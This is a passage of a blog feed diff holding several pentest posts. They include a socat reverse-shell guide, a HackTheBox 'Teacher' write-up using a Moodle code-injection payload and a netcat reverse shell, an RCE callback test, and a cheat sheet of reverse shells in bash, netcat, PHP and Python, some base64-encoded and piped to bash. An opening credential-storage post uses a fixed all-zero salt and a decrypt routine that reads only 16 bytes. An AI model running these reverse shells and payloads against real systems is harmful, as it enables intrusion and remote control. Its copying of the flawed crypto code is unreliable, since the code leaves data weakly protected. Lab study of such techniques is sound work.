+</code></pre></div>    </div>
+
+    <p>Function key derivation:</p>
+    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="k">def</span> <span class="nf">derive_keys</span><span class="p">(</span><span class="n">key</span><span class="p">):</span>
+      <span class="n">salt</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'0'</span><span class="o">*</span><span class="mi">16</span>
+      <span class="n">keys</span> <span class="o">=</span> <span class="n">PBKDF2</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">salt</span><span class="p">,</span> <span class="mi">64</span><span class="p">,</span> <span class="n">count</span><span class="o">=</span><span class="mi">1000000</span><span class="p">,</span> <span class="n">hmac_hash_module</span><span class="o">=</span><span class="n">SHA512</span><span class="p">)</span>
+      <span class="n">key1</span> <span class="o">=</span> <span class="n">keys</span><span class="p">[:</span><span class="mi">32</span><span class="p">]</span>
+      <span class="k">print</span><span class="p">(</span><span class="n">AES</span><span class="p">.</span><span class="n">block_size</span><span class="p">)</span>
+      <span class="k">return</span> <span class="n">key1</span>
+</code></pre></div>    </div>
+
+    <p>Encryption:</p>
+    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="k">def</span> <span class="nf">encrypt</span><span class="p">(</span><span class="n">plaintext</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
+      <span class="n">derived_key</span> <span class="o">=</span> <span class="n">derive_keys</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
+      <span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="p">.</span><span class="n">new</span><span class="p">(</span><span class="n">derived_key</span><span class="p">,</span> <span class="n">AES</span><span class="p">.</span><span class="n">MODE_CBC</span><span class="p">)</span>
+      <span class="n">ciphertext</span> <span class="o">=</span> <span class="n">cipher</span><span class="p">.</span><span class="n">encrypt</span><span class="p">(</span><span class="n">pad</span><span class="p">(</span><span class="n">plaintext</span><span class="p">,</span> <span class="n">AES</span><span class="p">.</span><span class="n">block_size</span><span class="p">))</span>
+      <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">'filename'</span><span class="p">,</span> <span class="s">'wb'</span><span class="p">)</span> <span class="k">as</span> <span class="n">c_file</span><span class="p">:</span>
+          <span class="n">c_file</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">cipher</span><span class="p">.</span><span class="n">iv</span><span class="p">)</span>
+          <span class="n">c_file</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">)</span>
+</code></pre></div>    </div>
+    <p>In order to decrypt the data we must store the ciphertext and the initialization vector (iv). A good practice is to store them in separate files but in our example we stored them in the same file.</p>
+
+    <p>Decryption:</p>
+    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="k">def</span> <span class="nf">decrypt</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">iv</span><span class="p">):</span>
+      <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s">'rb'</span><span class="p">)</span> <span class="k">as</span> <span class="n">c_file</span><span class="p">:</span>
+          <span class="n">iv</span> <span class="o">=</span> <span class="n">c_file</span><span class="p">.</span><span class="n">read</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span>
+          <span class="n">ciphertext</span> <span class="o">=</span> <span class="n">c_file</span><span class="p">.</span><span class="n">read</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span>
+
+      <span class="n">derived_key</span> <span class="o">=</span> <span class="n">derive_keys</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
+      <span class="n">cipher_de</span> <span class="o">=</span> <span class="n">AES</span><span class="p">.</span><span class="n">new</span><span class="p">(</span><span class="n">derived_key</span><span class="p">,</span> <span class="n">AES</span><span class="p">.</span><span class="n">MODE_CBC</span><span class="p">,</span> <span class="n">iv</span><span class="p">)</span>
+      <span class="n">plain_text</span> <span class="o">=</span> <span class="n">unpad</span><span class="p">(</span><span class="n">cipher_de</span><span class="p">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">),</span> <span class="n">AES</span><span class="p">.</span><span class="n">block_size</span><span class="p">)</span>
+      <span class="k">return</span> <span class="n">plain_text</span>
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<h2 id="final-thoughts">Final thoughts</h2>
+
+<p>Depending on the relevance of the data we want to protect we are going to use the suited method to store our API credentials. If our data is not very sensitive we can <em>store credentials on a text file</em> or use <em>keyring</em>. Those two methods are of extreme productivity and very easy to implement. On the other hand if our data is extremely sensitive we must hash/encrypt our API credentials. The method you need relies on your knowledge and responsibility.</p>
+
+<p>Thanks all for reading!</p>]]></content><author><name>isuckatlinux</name></author><category term="good-practice" /><category term="Python" /><category term="cryptography" /><summary type="html"><![CDATA[Introduction]]></summary></entry><entry><title type="html">Get Full Interactive reverse Shell With Socat</title><link href="https://abusinglinux.com//2022/02/11/get-full-interactive-reverse-shell-with-socat.html" rel="alternate" type="text/html" title="Get Full Interactive reverse Shell With Socat" /><published>2022-02-11T00:00:00+00:00</published><updated>2022-02-11T00:00:00+00:00</updated><id>https://abusinglinux.com//2022/02/11/get-full-interactive-reverse-shell-with-socat</id><content type="html" xml:base="https://abusinglinux.com//2022/02/11/get-full-interactive-reverse-shell-with-socat.html"><![CDATA[<h2 id="introduction">Introduction</h2>
+<p>Today we are going to see a nice method to get an interactive reverse shell with socat.
+A few adventages of use interactive shells are the next ones:</p>
+<ul>
+  <li>Ctrl + C work just fine, when you press it it doesn’t exit the shell, just stop the process is running</li>
+  <li>Autocompletation (Tabuation), in normal reverse shells tabulation just add a tabulation, in interactive shells tabs can autocomplete your code.</li>
+</ul>
+
+<h2 id="installing-socat">Installing socat</h2>
+<p>If we use security-based distros like Kali or Parrot, we should have socat installed, in any case, to install on the attacker’s machine:
+In our system:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>apt <span class="nb">install </span>socat
+</code></pre></div></div>
+
+<p>Socat may not be installed in the victim’s machine so we first we have to install it.<br />
+In this <a href="https://github.com/andrew-d/static-binaries">repo</a> we have a lot of binaries ready to be downloaded and executed, socat is one of this:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat
+</code></pre></div></div>
+
+<h2 id="getting-reverse-shell">Getting reverse shell</h2>
+
+<p>In $PORT we can choose a free port like 443</p>
+
+<p>In our attacker’s machine:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>socat file:<span class="s1">'/dev/tty'</span>,raw,echo<span class="o">=</span>0 tcp-listen:<span class="nv">$PORT</span>
+</code></pre></div></div>
+
+<p>In our victim’s machine</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./socat <span class="nb">exec</span>:<span class="s1">'bash -li'</span>,pty, stderr, setsid, sigint, sane tcp:<span class="nv">$ATTACKERS_IP</span>:<span class="nv">$PORT</span>
+</code></pre></div></div>]]></content><author><name>isuckatlinux</name></author><category term="rce" /><category term="socat" /><category term="reverse-shell" /><summary type="html"><![CDATA[Introduction Today we are going to see a nice method to get an interactive reverse shell with socat. A few adventages of use interactive shells are the next ones: Ctrl + C work just fine, when you press it it doesn’t exit the shell, just stop the process is running Autocompletation (Tabuation), in normal reverse shells tabulation just add a tabulation, in interactive shells tabs can autocomplete your code.]]></summary></entry><entry><title type="html">Teacher HTB Write Up</title><link href="https://abusinglinux.com//2022/02/06/teacher-htb-writeup.html" rel="alternate" type="text/html" title="Teacher HTB Write Up" /><published>2022-02-06T00:00:00+00:00</published><updated>2022-02-06T00:00:00+00:00</updated><id>https://abusinglinux.com//2022/02/06/teacher-htb-writeup</id><content type="html" xml:base="https://abusinglinux.com//2022/02/06/teacher-htb-writeup.html"><![CDATA[<h2 id="introduction">Introduction</h2>
+<p>Hello everyone! Today we are going to be working on a HTB machine called Teacher. We will be practicing how to bruteforce some logins, also how to discover moodle version and how to attack an especific version of itself. Also we are going to see how to exploit missconfigured crontab.</p>
+
+<h2 id="ports-recognizement">Ports recognizement</h2>
+<p>We are going to be discovering all open ports and extract the output into a grepeable file called <em>allPorts</em>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-sC</span> <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">--min-rate</span> 10000 10.10.10.153 <span class="nt">-oG</span> allPorts
+</code></pre></div></div>
+
+<p>We are going to use <a href="https://github.com/isuckatlinux/getPorts">getPorts</a> in order to extract the ports from the grepeable file.</p>
+
+<p>Now we can enummerate all the services that are running on the system.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-sC</span> <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> <span class="nt">-p80</span> <span class="nt">--min-rate</span> 10000 10.10.10.153 <span class="nt">-oN</span> services
+</code></pre></div></div>
+<p><img src="https://abusinglinux.com/assets/images/teacher-htb/services.png" alt="services-photo" /></p>
+
+<h2 id="inspect-the-website">Inspect the website</h2>
+
+<p>Meanwhile we inspect the site we are going to leave wfuzz running.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz <span class="nt">--hc</span> 404 <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="nt">-c</span> <span class="nt">-u</span> http://10.10.10.153/FUZZ
+</code></pre></div></div>
+
+<p>Most of the visible links doesn’t work, except one, <em>gallery.html</em>.
+We can see a bunch of blurred pictures, so maybe we have to apply <a href="https://www.youtube.com/watch?v=TWEXCYQKyDc">steganography</a>.</p>
+
+<p>If we inspect the code we can notice that there is one picture that is slightly different than the other’s.</p>
+
+<p><img src="https://abusinglinux.com/assets/images/teacher-htb/images_teacher.png" alt="photo" /></p>
+
+<p>We are going to request that photo in order to see what’s hiding.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget http://10.10.10.153/images/5.png <span class="nt">-o</span> fake_picture.png
+</code></pre></div></div>
+<p><br />
+If we try to see the picture:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>feh fake_picture.png
+</code></pre></div></div>
+
+<p><img src="https://abusinglinux.com/assets/images/teacher-htb/feh-error.png" alt="error-photo" /></p>
+
+<p>We have an error that tell us that this picture is not actually a picture.
+We will try to enumerate his content:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>fake_picture.png
+</code></pre></div></div>
+<p>The output:</p>
+<pre><code class="language-txt">Hi Servicedesk,
+
+I forgot the last charachter of my password. The only part I remembered is Th4C00lTheacha.
+
+Could you guys figure out what the last charachter is, or just reset it?
+
+Thanks,
+Giovanni
+</code></pre>
+<p>While all this happen we can check wfuzz again and we discover a few sites, there’s one called <em>moodle</em> which have a login.🤟</p>
+
+<h2 id="bruteforce-login">Bruteforce login</h2>
+
+<p>So now, we have the a potential teacher’s username (Giovanni) and a incomplete password(Th4C00lTheacha) but we miss one character.</p>
+
+<p>We can build a simple python3 script in order to get the last character of the password.
+Here’s the <a href="https://github.com/isuckatlinux/htbmachines/blob/main/teacher/scripts/brute_pass_giovanni.py">script</a>
+It is a simple brute force script which try three usernames (giovanni, Giovanni, giovanni@backhatuni.htb)
+In case they were using private mail server.</p>
+
+<p>We got that the credentials are <em>giovanni:Th4C00lTheacha#</em></p>
+
+<p>We can login into moodle with that credentials.</p>
+
+<p>If we inspect the chat he told the admin he wan’t to make a quiz, that might be a clue.</p>
+
+<h2 id="get-moodle-version">Get Moodle version</h2>
+
+<p>Now we have teacher’s credentials we have to find any vulneravility in the moodle service.
+If we search for Moodle into the <a href="https://www.exploit-db.com/">exploit database</a> we have a few vulneravilities, but the problem is that we don’t have the moodle version.</p>
+
+<p>I create a <a href="https://github.com/isuckatlinux/moodleVersion">script</a> to get the version of a moodle service</p>
+
+<p>If we run the script:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 authenticated_teacher_moodle_version.py <span class="nt">-u</span> http://10.10.10.153/moodle <span class="nt">--username</span> giovanni <span class="nt">--password</span> Th4C00lTheacha#
+</code></pre></div></div>
+
+<p>We have into the output that the moodle version is 3.4</p>
+
+<p>Now if we look again in the <a href="https://www.exploit-db.com/">exploit database</a> filtering by 3.4 moodle version we can find that there’s a vulneravility what allow us to inyect code into a specific quiz.
+This <a href="https://blog.sonarsource.com/moodle-remote-code-execution?redirect=rips">blog</a> relate very well the vulnearability if you want to check it out.</p>
+
+<h2 id="getting-www-data-shell">Getting www-data shell</h2>
+
+<p>If we look into the courses we can see there’s only one course wich is already finished (Algebra).
+If we go into that course we can see a few resources into the course page.</p>
+
+<p><img src="https://abusinglinux.com/assets/images/teacher-htb/algebrapage.png" alt="algebra-page" /></p>
+
+<p>We can click into the setting and then turn editing on.
+The we can add an activity or resource and we add a quiz.</p>
+
+<p>We have to set a random name, random description and we have to save and display. The we have to edit the quiz and add a new question which will be a <em>Calculated</em>.
+<br />
+We have to add a random question name, a random question text, we will have to set the grade on 100%.
+On the formula field is the place in which we have to set the payload which is</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="cm">/*{a*/</span><span class="sb">`$_GET[0]`</span><span class="p">;</span><span class="c1">//{x}}</span>
+</code></pre></div></div>
+<p><em>Again, there’s more explanation about this exploit in this <a href="https://blog.sonarsource.com/moodle-remote-code-execution?redirect=rips">blog</a></em></p>
+
+<p>So we set this string into the filed and then we save changes.
+Since the php service is waiting for the 0 in the url to be execute we have to add to the url the payload in order to get the reverse shell:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&amp;0<span class="o">=(</span>nc <span class="nt">-e</span> /bin/bash <span class="nv">$IP</span> <span class="nv">$PORT</span><span class="o">)</span>
+</code></pre></div></div>
+<p>Before executing this we have to listn with netcat on the port that we selected, for example 443.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lvnp</span> 443
+</code></pre></div></div>
+<p>We have a shell in www-data!</p>
+
+<p>We can upgrade the shell with:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python <span class="nt">-c</span> <span class="s1">'import pty; pty.spawn("/bin/bash")'</span>
+</code></pre></div></div>
+
+<h2 id="lateral-movement">Lateral movement</h2>
+
+<p>If we list the users of the machine, we can see that giovanni is an user who’s problably have the user flag.
+We can try to grab it:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> /home/giovanni/user.txt
+</code></pre></div></div>
+<p>But we got an error.</p>
+
+<p>We can try switch the user with the same password that we used before to login into the moodle site, but doesn’t work.</p>
+
+<p>If we look into the server files we can see a pretty interesting file called config.php.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>config.php
+</code></pre></div></div>
+
+<p>We can see the system that is running the database(mariadb), and some credentiales for the database(root:Welkom1!)</p>
+
+<p>If we try to login to mariadb</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mariadb <span class="nt">-u</span> root <span class="nt">-p</span>
+</code></pre></div></div>
+<p>And we enter the password ‘Welkom1!’, we are inside the database!</p>
+
+<h3 id="enumerate-the-database">Enumerate the database</h3>
+
+<p>We can list the databases:</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">show</span> <span class="n">databases</span><span class="p">;</span>
+</code></pre></div></div>
+<p>Output:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>+--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| moodle             |
+| mysql              |
+| performance_schema |
+| phpmyadmin         |
++--------------------+
+</code></pre></div></div>
+<p>moodle is an interesting database worth to explore.</p>
+
+<p>Now we can list the tables:</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">show</span> <span class="n">tables</span><span class="p">;</span>
+</code></pre></div></div>
+<p>Now we have a lot of tables, but there is one particular table which drag my attention called <em>mdl_user</em></p>
+
+<p>We can describe the table;</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">describe</span> <span class="n">mdl_user</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>Now we have a lot of rows but again there are some rows particulally interesting, username and password.</p>
+
+<p>So we create a query to list all the data about that fields:</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="n">username</span><span class="p">,</span> <span class="n">password</span> <span class="k">from</span> <span class="n">mdl_user</span><span class="p">;</span>
+</code></pre></div></div>
+<p>We have and output:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>+-------------+--------------------------------------------------------------+
+| username    | password                                                     |
++-------------+--------------------------------------------------------------+
+| guest       | $2y$10$ywuE5gDlAlaCu9R0w7pKW.UCB0jUH6ZVKcitP3gMtUNrAebiGMOdO |
+| admin       | $2y$10$7VPsdU9/9y2J4Mynlt6vM.a4coqHRXsNTOq/1aA6wCWTsF2wtrDO2 |
+| giovanni    | $2y$10$38V6kI7LNudORa7lBAT0q.vsQsv4PemY7rf/M1Zkj/i1VqLO0FSYO |
+| Giovannibak | 7a860966115182402ed06375cf0a22af                             |
++-------------+--------------------------------------------------------------+
+</code></pre></div></div>
+<p>As we can see there some password hashed but there is one from the user Giovannibak which is different and can remember us md5.</p>
+
+<p>If we use some online md5 decriptor we can see that the password encripted is <em>expelled</em></p>
+
+<p>Now we exit from the database and try to switch user with this password.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>su giovanni
+expelled
+</code></pre></div></div>
+
+<p>We enter into the giovani’s account! We are in!
+We can see the user flag.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> /home/giovanni/user.txt
+</code></pre></div></div>
+
+<h2 id="pivilege-excalation">Pivilege excalation</h2>
+
+<p>In the giovanni’s workspace there are a few files. On one of them we can notice the timestamp of the file keep changing every minute so, we can deduce there is a cronjob replacing every minute the file.</p>
+
+<p>We can search for a filename called backup</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / <span class="nt">-name</span> <span class="s2">"*backup*"</span> 2&gt; /dev/null
+</code></pre></div></div>
+
+<p>We see a bunch of files called backup
+There is one file called backup.sh
+We can inspect that file:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+<span class="nb">cd</span> /home/giovanni/work<span class="p">;</span>
+<span class="nb">tar</span> <span class="nt">-czvf</span> tmp/backup_courses.tar.gz courses/<span class="k">*</span><span class="p">;</span>
+<span class="nb">cd </span>tmp<span class="p">;</span>
+<span class="nb">tar</span> <span class="nt">-xf</span> backup_courses.tar.gz<span class="p">;</span>
+<span class="nb">chmod </span>777 <span class="k">*</span> <span class="nt">-R</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>We can replace the course folder allocated at work with a symlink to /root.
+We have to wait a minute to the cronjob to take effect and all the content of root will be copied at our courses folder.</p>
+
+<p>To create the symbolic link:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">rm</span> <span class="nt">-rf</span> courses
+<span class="nb">ln</span> <span class="nt">-s</span> /root courses
+</code></pre></div></div>
+<p><em>Wait 1 minute</em></p>
+
+<p>We can grab the flag!</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd </span>courses
+<span class="nb">cat </span>root.txt
+</code></pre></div></div>]]></content><author><name>isuckatlinux</name></author><category term="hackthebox" /><category term="writeup" /><category term="moodle" /><summary type="html"><![CDATA[Introduction Hello everyone! Today we are going to be working on a HTB machine called Teacher. We will be practicing how to bruteforce some logins, also how to discover moodle version and how to attack an especific version of itself. Also we are going to see how to exploit missconfigured crontab.]]></summary></entry><entry><title type="html">How to test a RCE</title><link href="https://abusinglinux.com//2022/02/04/test-rce.html" rel="alternate" type="text/html" title="How to test a RCE" /><published>2022-02-04T00:00:00+00:00</published><updated>2022-02-04T00:00:00+00:00</updated><id>https://abusinglinux.com//2022/02/04/test-rce</id><content type="html" xml:base="https://abusinglinux.com//2022/02/04/test-rce.html"><![CDATA[<h2 id="introduction">Introduction</h2>
+<p>In this post we are going to cover ways to test our potential RCE.
+This is a good practice before getting the shell, if we do this test, we will test that the RCE that we found is correct and functional</p>
+
+<h2 id="python-http-server">Python http server</h2>
+<p>The concept of this test is very simple, we are going to publish a site. We will inject a command wich will contain a GET request to an object on our http server.
+If we see a message that says some client is sending us a GET request in our machine, we will know we have connectivity and we can inject commands.</p>
+
+<blockquote>
+  <p>Note that the object in our web doesn’t have to exist, the client (victim) will request some random object, and a message in our server will pop, telling us that someone (victim) is trying to get a resource that doens’t exist. But we dont care about that, the point of this is test command injection and connectivity, not share objects.</p>
+</blockquote>
+
+<p>We run this command to start the server in the attacker’s machine</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-m</span> http.server
+</code></pre></div></div>
+
+<p>The command what we have to inject in the victim’s machine computer:</p>
+<h3 id="linux">Linux</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget <span class="nv">$IP</span>:8000/aaaa
+</code></pre></div></div>
+<h3 id="windows">Windows</h3>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Invoke-WebRequest</span><span class="w"> </span><span class="nt">-URI</span><span class="w"> </span><span class="nv">$</span><span class="nn">IP</span><span class="p">:</span><span class="nv">8000</span><span class="nx">/aaaa</span><span class="w">
+</span></code></pre></div></div>
+
+<p>If we get any response at the server machine mean’s that our RCE work’s just fine.</p>
+
+<h2 id="hosting-pings">Hosting pings</h2>
+
+<p>The idea behind this test is also very simple.
+We will be starting a server to listen ICMP pings.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>tcpdump <span class="nt">-ni</span> <span class="nv">$network_interface</span> icmp
+</code></pre></div></div>
+
+<p>In the $network_interface we have to set our current network interface (In the most cases wlan0 or eth0)</p>
+
+<p>In the victimi’s machine we have to inject:</p>
+
+<h3 id="linux-1">Linux</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ping <span class="nt">-c</span> 1 <span class="nv">$IP</span>
+</code></pre></div></div>
+
+<h3 id="windows-1">Windows</h3>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ping</span><span class="w"> </span><span class="nv">$IP</span><span class="w">
+</span></code></pre></div></div>
+
+<p>If we get any response at our server that mean’s that the RCE works.</p>]]></content><author><name>isuckatlinux</name></author><category term="reverse-shell" /><category term="pentest-basics" /><category term="rce" /><summary type="html"><![CDATA[Introduction In this post we are going to cover ways to test our potential RCE. This is a good practice before getting the shell, if we do this test, we will test that the RCE that we found is correct and functional]]></summary></entry><entry><title type="html">Get reverse shell with RCE</title><link href="https://abusinglinux.com//2022/02/03/get-reverse-shell-with-rce.html" rel="alternate" type="text/html" title="Get reverse shell with RCE" /><published>2022-02-03T00:00:00+00:00</published><updated>2022-02-03T00:00:00+00:00</updated><id>https://abusinglinux.com//2022/02/03/get-reverse-shell-with-rce</id><content type="html" xml:base="https://abusinglinux.com//2022/02/03/get-reverse-shell-with-rce.html"><![CDATA[<h2 id="introduction">Introduction</h2>
+
+<p>When we are triying to pwn a machine we look for a shell connected to the victim’s machine. Sometimes we can found some credentiales or RSA keys to connect via SSH. More times we can’t get a SSH shell but we have some <a href="https://www.n-able.com/blog/remote-code-execution">RCE</a>.
+In this article we are going to cover different ways to get a reverse shell with <a href="https://www.n-able.com/blog/remote-code-execution">RCE</a></p>
+
+<p>Soon, in later articles we are going to be covering how to upgrade these shell’s because these are not interactive, means, for example, that if we press TAB we won’t get an autocompletion, we will just get a tabulation.</p>
+
+<p>Also, a good practice before try to connect a reverse shell is try to test this RCE first create the shell.
+In this <a href="https://www.abusinglinux.com/2022/02/04/test-rce.html">article</a> we cover how to test this.</p>
+
+<p>For the porpous of this post we are going to be using an Ubuntu FocalFossa machine from <a href="https://www.osboxes.org/">osboxes.org </a></p>
+
+<h3 id="getting-an-interactive-reverse-shell-with-socat">Getting an interactive reverse shell with socat</h3>
+<p>In this <a href="https://www.abusinglinux.com/2022/02/11/get-full-interactive-reverse-shell-with-socat.html">post</a> we cover how to get an interactive reverse shell with socat</p>
+
+<h2 id="concepts-and-notation">Concepts and notation</h2>
+<p>In order to follow this post we have to make clear some concpets and notation.
+When we say $IP we mean the ip address of the attacker’s machine. You can choose any port for $PORT, just remember have to be a number between 1 and 65,535. Also the port have to be free, no service have to be running. A common port used to reverse shell is 443</p>
+
+<h2 id="from-attackers-machine">From attacker’s machine</h2>
+<p>In most of the cases we are going to use netcat in order to listen to the comunication
+This will be the only command we execute in our attacker’s machine, the rest of them will be executed on the victim’s machine.</p>
+
+<p>We have to run:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lvnp</span> <span class="nv">$PORT</span>
+</code></pre></div></div>
+<p>With this command we are going to be waiting for connecions at this port in our machine.</p>
+
+<h2 id="from-victims-machine">From victim’s machine</h2>
+<p>The command that we have to inject are one of those:</p>
+
+<h3 id="bash">Bash</h3>
+
+<p>This is propably the easiest way to do it.
+We have to enter this command in the victim’s machine</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/<span class="nv">$IP</span>/<span class="nv">$PORT</span> 0&gt;&amp;1
+</code></pre></div></div>
+
+<h3 id="netcat">Netcat</h3>
+
+<p>If netcat is installed in the victmim’s machine we can also got a reverse shell</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-nv</span> <span class="nv">$IP</span> <span class="nv">$PORT</span> <span class="nt">-e</span> /bin/sh
+nc <span class="nt">-nv</span> <span class="nv">$IP</span> <span class="nv">$PORT</span> <span class="nt">-e</span> /bin/bash
+</code></pre></div></div>
+<p>Either of this two commands will work.</p>
+
+<h3 id="php">PHP</h3>
+
+<p>If we have php installed on the victim’s machine we can:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="n">php</span> <span class="o">-</span><span class="n">r</span> <span class="s1">'$sock=fsockopen("$IP",$PORT);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span>
+</code></pre></div></div>
+
+<h3 id="python">Python</h3>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$IP",$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span>
+</code></pre></div></div>
+
+<h2 id="special-cases">Special cases</h2>
+<p>We just saw a few ways to get a reverse shell but sometimes we have to inject the code on an url. So there’s a problem because if we try to inject the bash code we can see that there is some special characters that the web would recognize like /. We wan’t to pass that command as a string, so the web can’t recognize that characters.</p>
+
+<h3 id="encode-to-base64">Encode to base64</h3>
+<p>First we have encode the command to base64.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="nv">$command_to_convet</span> | <span class="nb">base64</span>
+</code></pre></div></div>
+<p>For example we are going to convert:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/192.168.1.36/443 0&gt;&amp;1
+</code></pre></div></div>
+<p>The result:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMzYvNDQzIDA+JjEK
+</code></pre></div></div>
+<p>We notice that now we dont have those special characters that were bothering us, but now we have another problem.
+We can’t just pass this encode string and expect the victim’s machine to recognize IT.</p>
+
+<p>So we have to tell it how to decode and execute, THIS IS THE FINAL URL COMMAND THAT WE HAVE TO INJECT:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="nv">$encode_string</span>|base64 <span class="nt">-d</span>|bash
+</code></pre></div></div>
+<p>We just to put the previusly encoded string into the $encode_string variable</p>]]></content><author><name>isuckatlinux</name></author><category term="reverse-shell" /><category term="pentest-basics" /><category term="rce" /><summary type="html"><![CDATA[Introduction]]></summary></entry><entry><title type="html">NodeBlog HTB Write Up</title><link href="https://abusinglinux.com//2022/01/18/nodeblog-writeup.html" rel="alternate" type="text/html" title="NodeBlog HTB Write Up" /><published>2022-01-18T00:00:00+00:00</published><updated>2022-01-18T00:00:00+00:00</updated><id>https://abusinglinux.com//2022/01/18/nodeblog-writeup</id><content type="html" xml:base="https://abusinglinux.com//2022/01/18/nodeblog-writeup.html"><![CDATA[<h2 id="introduction">Introduction</h2>
